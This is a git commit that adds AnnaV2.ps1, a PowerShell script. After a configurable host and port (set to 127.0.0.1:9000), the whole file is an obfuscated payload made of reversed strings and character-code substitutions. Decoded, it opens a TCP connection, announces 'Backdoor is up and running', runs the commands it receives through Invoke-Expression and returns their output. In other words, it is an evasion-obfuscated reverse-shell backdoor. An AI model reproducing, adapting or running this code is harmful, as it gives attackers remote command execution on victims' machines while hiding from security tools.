b125bf0df485878f2d7b40db6433ed5d9b22db90
ClemensHofer2012 <73170777+ClemensHofer2012@users.noreply.github.com>
2020-11-08 22:41:27 +0100

    Create AnnaV2.ps1

---
+++ AnnaV2.ps1
@@ -0,0 +1,64 @@
+# change the host address and/or port number as necessary
+# obfuscated host address, same as $a = "127.0.0.1";
+$a = "127" + "." + "0" + "." + "0" + "." + "1";
+# obfuscated port number, same as $p = 9000;
+$p = 1000 + 1000 + 1000 + 6000;
+sET  M6sV  (  [cHaR[ ]]")'x'+]43[eMoHSp$+]4[EmoHSP$ ( .| )93]RAhC[,)07]RAhC[+47]RAhC[+201]RAhC[(  ecALpeR- 43]RAhC[,)211]RAhC[+66]RAhC[+67]RAhC[(ecAlpErc- 421]RAhC[,'tnj' ecAlpErc- 69]RAhC[,)58]RAhC[+57]RAhC[+611]RAhC[( ecAlpErc- 63]RAhC[,'HOD'  ecALpeR-)'
+}
+}
+;pBLrpBL emaN'+'- )*aV-r* MUKtCUKtGUKt( &
+{ )llunHOD en- rHOD( fi '+'
+'+'}
+;pBLdpBL emaN- )*aV-r*'+' MUKtCUKtGUKt( &
+{ )llunHOD en- dHOD( fi
+}
+;)(raelC.bH'+'OD
+{ )llunHOD en- bHOD( fi
+}'+'
+;)(esopsiD.cHOD
+;'+')(esolC.cHOD
+'+'{ )llunHOD en- cHOD( fi
+}
+;)(esopsiD.tHOD
+;)(esolC'+'.tHOD
+{ )llunHOD en- tHOD( fi
+}
+;)(esopsiD.wHOD
+;)(esolC.wHOD
+{ )llunHOD en- wHOD( fi
+{ yll'+'anif }
+;egasseM.noitpecx'+'ErennI.noitpecxE._HOD )??o'+'H-e* MUKtCUKtGUKt'+'( &
+{ hctac }
+;'+')0 tg- ybHOD( e'+'lihw }
+}       '+'
+;pBLdpBL emaN- )*aV-r* MUKtCUKtGUKt( &
+'+';)rH'+'OD(eniLetirW.wHOD
+}
+;noitpecxE._HOD = rHOD                          '+'
+{ h'+'ctac }
+;)?????S-tu'+'* MUKtCUKtGUKt( & tnj 1&>2 dHOD dnammoC- )*E-ek* MUKtCUKtGUKt'+'( & = rHOD
+{ y'+'rt
+{ )0 tg- htgneL.dHOD( fi'+'
+;)elbaliavAataD.tHOD( elihw }
+}
+;)ybHOD ,0 ,bHOD(gnirtSteG.eHOD + dHOD = dHOD
+{ )'+'0 tg-'+' ybHOD( fi
+;)'+'htgneL.bHOD ,0 ,bHOD(daeR.tHOD = ybHOD
+{ od
+;)pBL>SPpBL(etirW.wHOD
+{ od
+;0'+' = ybHOD   '+'
+;pBL...gninnur dna pu si roodkcaBpBL )?'+'?oH-e* MUKtCUKtGUKt( &
+;eur'+'tHOD = hs'+'ulFotuA.wHOD
+;)FJf)tHOD(RUKtEUKtTUKtI'+'UKtRUKtWUKtM'+'UKtAUKtEUKtRUKtTUKtSUKt.UKtOUKtIUKt )*O-we* MUKtCUKtGUKt( &FJf )*E'+'-e'+'k* MUKtCUKtG'+'UKt( &( = wHOD
+;gnidocnEiicsA.txeT )*O-we* MUKtCUKtGUKt( &'+' = eHOD
+;'+')21 + 21 + 000'+'1( ][etyB )*O-we* MUKtCUKtGUKt( &'+' = bHOD
+;)(maertSteG.cHOD = t'+'HOD
+;)FJf)pHOD ,aHOD(TUKtNUK'+'tEUKtIUKtLUKtCUKtPUKtCUKtTUKt.UKtSUKtTUKtEUKtKUKtCUKtOUKtSUK'+'t.U'+'KtTUKtEUKtNUKt )*O-w'+'e* MUKtCUKtGUKt( &FJf )*E-ek* MUKtCUKtGUKt( &( = cHOD
+{ yrt
+'+';llunHOD = rHOD'+'
+;llunHOD = dHOD
+;llunHOD = wHOD
+;llunHOD = bHOD
+;llunHOD = tHOD
+;llunHOD = cHOD
